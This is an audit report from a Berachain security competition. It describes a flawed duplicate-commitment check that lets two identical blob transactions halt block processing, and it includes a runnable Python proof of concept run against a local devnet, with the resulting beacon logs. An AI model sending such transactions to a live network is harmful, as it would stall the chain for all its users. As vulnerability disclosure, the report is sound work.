---
tags:
  - lang/solidity
  - platform/cantina
  - has/poc
  - severity/high
  - sector/governance
  - sector/infra
  - sector/liquid-staking
  - sector/staking
report: "https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf"
genome:
  - "[[wrong-condition]]"
  - "[[permanent]]"
  - "[[proposal-state-check]]"
  - "[[commitment-uniqueness]]"
---
# Malicious user can halt EVM chain by providing two similar blobs in a single EVM block 

- id: 53117
- impact: HIGH
- protocol: [[Berachain]]
- reporter: zigtur (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_berachain_january2025.pdf

## Summary


The bug report is about an incorrect check for duplicate commitments in a function called verifySidecars. This function is used to verify sidecars in a given consensus block, but it is not correctly checking for duplicate KZG commitments. This means that a user can send two blob transactions with the same data, which will result in the same KZG commitment. This causes a problem when the consensus layer prepares a proposal from this block, as it will have two sidecars with the same KZG commitment. The report includes a Proof of Concept that demonstrates this issue and suggests a solution to fix it. The bug has been fixed in a recent commit.

## Details

## Context
veriﬁer.go#L89-L94

## Description
During `ProcessProposal` of a given consensus block, the `verifier.verifySidecars` function loops through the sidecars to verify them. Multiple checks are done. However, this function incorrectly checks for duplicate commitments in these sidecars. It will return an error when duplicate KZG commitments are found in the sidecars.

```go
// verifySidecars verifies the blobs for both inclusion as well
// as the KZG proofs.
func (bv *verifier) verifySidecars(
	sidecars datypes.BlobSidecars,
	blkHeader *ctypes.BeaconBlockHeader,
	verifierFn func(
		blkHeader *ctypes.BeaconBlockHeader,
		signature crypto.BLSSignature,
	) error,
) error {
	// ...
	// create lookup table to check for duplicate commitments
	duplicateCommitment := make(map[eip4844.KZGCommitment]struct{})
	// Validate sidecar fields against data from the BeaconBlock.
	for i, s := range sidecars {
		// Check if sidecar's kzgCommitment is duplicate. Along with the
		// length check and the inclusion proof, this fully verifies that
		// the KzgCommitments in the BlobSidecar are the exact same as the
		// ones in the BeaconBlockBody without having to explicitly compare.
		if _, exists := duplicateCommitment[s.GetKzgCommitment()]; exists {
			return errors.New(
				"found duplicate KzgCommitments in BlobSidecars", // @POC: in case of duplicate, return an
				// error and reject the proposal,
			)
		}
		duplicateCommitment[s.GetKzgCommitment()] = struct{}{}
		// ...
	}
```

This duplicate check is incorrect. Indeed, two blobs with the exact same data will result in the same KZG commitment. So a user can send two blob transactions with the same blob data. These two blobs will be included in a single EVM block by the execution layer. Then, the consensus layer will prepare a proposal from this EVM block with two sidecars having the same KZG commitment.

## Proof of Concept
- **Instructions**: Start the local devnet.
  ```bash
  make start > logs-beacon.ansi
  make start-reth
  ```
  Then, install the Python dependencies.
  ```bash
  python3 -m venv localenv
  source localenv/bin/activate
  pip3 install web3 requests
  ```
  Finally, execute the following Python script. It sends two Blob transactions with the same data such that the chain is not able to process any other block.

  ```python
  import os
  from eth_abi import abi
  from eth_utils import to_hex
  from web3 import HTTPProvider, Web3

  def send_blob():
      rpc_url = "http://127.0.0.1:8545"
      private_key = "0xfffdbb37105441e14b0ee6330d855d8504ff39e705c3afa8f859ac9865f99306"
      w3 = Web3(HTTPProvider(rpc_url))
      text = ""
      encoded_text = abi.encode(["string"], [text])
      print("Text:", encoded_text)
      # Blob data must be comprised of 4096 32-byte field elements
      # So yeah, blobs must be pretty big
      BLOB_DATA = (b"\x00" * 32 * (4096 - len(encoded_text) // 32)) + encoded_text
      acct = w3.eth.account.from_key(private_key)
      nonce = w3.eth.get_transaction_count(acct.address)
      tx = {
          "type": 3,
          "chainId": 80087,  # Anvil
          "from": acct.address,
          "to": "0x0000000000000000000000000000000000000000",
          "value": 0,
          "maxFeePerGas": 10**12,
          "maxPriorityFeePerGas": 10**12,
          "maxFeePerBlobGas": to_hex(10**12),
          "nonce": nonce,
      }
      tx["gas"] = 10**6
      tx2 = {
          "type": 3,
          "chainId": 80087,  # Anvil
          "from": acct.address,
          "to": "0x0000000000000000000000000000000000000000",
          "value": 0,
          "maxFeePerGas": 10**12,
          "maxPriorityFeePerGas": 10**12,
          "maxFeePerBlobGas": to_hex(10**12),
          "nonce": nonce + 1,
      }
      tx2["gas"] = 10**6
      signed = acct.sign_transaction(tx, blobs=[BLOB_DATA])
      signed2 = acct.sign_transaction(tx2, blobs=[BLOB_DATA])
      tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
      tx_hash2 = w3.eth.send_raw_transaction(signed2.raw_transaction)
      tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
      tx_receipt2 = w3.eth.wait_for_transaction_receipt(tx_hash2)
      print(f"Tx receipt: {tx_receipt}")
      print(f"Tx2 receipt: {tx_receipt2}")

  def main() -> int:
      send_blob()
      return 0

  if __name__ == "__main__":
      main()
  ```

### Results
The following logs are printed by the beacon kit. It wasn't able to process the consensus block because it found duplicate KZG commitments. Note the rejecting incoming blob sidecars log: 
```
service=blockchain reason=found duplicate KzgCommitments in BlobSidecars
```
This is due to the two blob transactions with the same blob data being included in a single EVM block.
```
2025-01-14T10:18:10+01:00 INFO indexed block events module=txindex height=114
2025-01-14T10:18:10+01:00 INFO Saving AddrBook to file module=p2p book=.tmp/beacond/config/addrbook.json size=0
2025-01-14T10:18:10+01:00 INFO Ensure peers module=pex numOutPeers=0 numInPeers=0 numDialing=0 numToDial=10
2025-01-14T10:18:10+01:00 INFO No addresses to dial. Falling back to seeds module=pex
2025-01-14T10:18:11+01:00 INFO Timed out module=consensus dur=988.899444 height=115 round=0 step=RoundStepNewHeight
2025-01-14T10:18:11+01:00 INFO Payload retrieved from local builder service=payload-builder for_slot=115
override_builder=false payload_block_hash=0x4a1f77236ef549d79e42ccd8cb2370369cab9af21eee4632e1da987d2b1991f7 parent_hash=0xc2722f827757903f4c6a878516a4dcbee3ac2136795e2499ed1f7a3415a18dcc num_blobs=2
2025-01-14T10:18:11+01:00 INFO Building block body with local deposits service=validator start_index=1 num_deposits=0
2025-01-14T10:18:11+01:00 INFO processExecutionPayload service=state-processor consensus height=115 payload height=115 payload timestamp=1736846290 consensus timestamp=1736846290 skip payload verification=true
2025-01-14T10:18:11+01:00 INFO Processed withdrawals service=state-processor num_withdrawals=1 bera_inflation=10
2025-01-14T10:18:11+01:00 INFO Beacon block successfully built service=validator slot=115 state_root=0x4403ee4dc13ccaa9e7e9df31131c7717de1ccf9b3c749d2c68f191bdcff652e2 duration=17.962585ms
2025-01-14T10:18:11+01:00 INFO Received proposal module=consensus proposal=Proposal{115/0 (00F11CB43A9800E2E90BD78B6598ABD23F8E2B78DEE937C42E6101840FA487D7:5:59A2F27C2B5B, -1) B4D124ABAF8F @ 2025-01-14T09:18:10.722713825Z}
2025-01-14T10:18:11+01:00 INFO Received complete proposal block module=consensus height=115 hash=00F11CB43A9800E2E90BD78B6598ABD23F8E2B78DEE937C42E6101840FA487D7
2025-01-14T10:18:11+01:00 INFO Received incoming blob sidecars service=blockchain
2025-01-14T10:18:11+01:00 ERRR rejecting incoming blob sidecars service=blockchain reason=found duplicate KzgCommitments in BlobSidecars
2025-01-14T10:18:11+01:00 ERRR failed to verify incoming blob sidecars service=blockchain error=found duplicate KzgCommitments in BlobSidecars
2025-01-14T10:18:11+01:00 ERRR failed to process proposal height=115 hash=00F11CB43A9800E2E90BD78B6598ABD23F8E2B78DEE937C42E6101840FA487D7 err=found duplicate KzgCommitments in BlobSidecars
2025-01-14T10:18:11+01:00 ERRR Prevote step: state machine rejected a proposed block; this should not happen:the proposer may be misbehaving; prevoting nil height=115 round=0 module=consensus err=null
2025-01-14T10:18:12+01:00 INFO Timed out module=consensus dur=1000 height=115 round=0 step=RoundStepPrecommitWait
2025-01-14T10:18:12+01:00 INFO Resetting proposal info module=consensus height=115 round=1 proposer=DAFB9F9ACEE09275EFCA806D6072D4432278479F
2025-01-14T10:18:12+01:00 WARN aborting payload build; payload already exists in cache service=payload-builder for_slot=115 parent_block_root=0xb11e6a2eeb39b0b7cc6fe88cbff366ac9e1cde802991ea96bcc017487bf6a05e
2025-01-14T10:18:12+01:00 INFO Waiting for local payload to be delivered to execution client service=payload-builder for_slot=115 timeout=1.2s
2025-01-14T10:18:13+01:00 ERRR failed to prepare proposal height=115 err=got an unexpected server error in JSON-RPC response failed to convert from jsonrpc.Error: Error -38001 (Unknown payload)
2025-01-14T10:18:13+01:00 INFO Received proposal module=consensus proposal=Proposal{115/1 (E88C874EF4A11B2B9C20672E4EA02D555AE3B1898FDF614717C5DE5016041B1F:1:0BB6D1E9C086, -1) 902AFFD676AC @ 2025-01-14T09:18:10.722713825Z}
2025-01-14T10:18:13+01:00 INFO Received complete proposal block module=consensus height=115 hash=E88C874EF4A11B2B9C20672E4EA02D555AE3B1898FDF614717C5DE5016041B1F
2025-01-14T10:18:14+01:00 ERRR failed to process proposal height=115 hash=E88C874EF4A11B2B9C20672E4EA02D555AE3B1898FDF614717C5DE5016041B1F err=no beacon block in abci request
2025-01-14T10:18:14+01:00 ERRR Prevote step: state machine rejected a proposed block; this should not happen:the proposer may be misbehaving; prevoting nil module=consensus height=115 round=1 err=null
2025-01-14T10:18:15+01:00 INFO Timed out module=consensus dur=1500 height=115 round=1 step=RoundStepPrecommitWait
```

## Recommendation
The `duplicateCommitment` check should accept duplicate KZG commitments when the sidecar index is different. This will allow having two blobs with the same data while ensuring that there are no duplicate sidecars.

### Berachain
Fixed in commit `1a312899`.
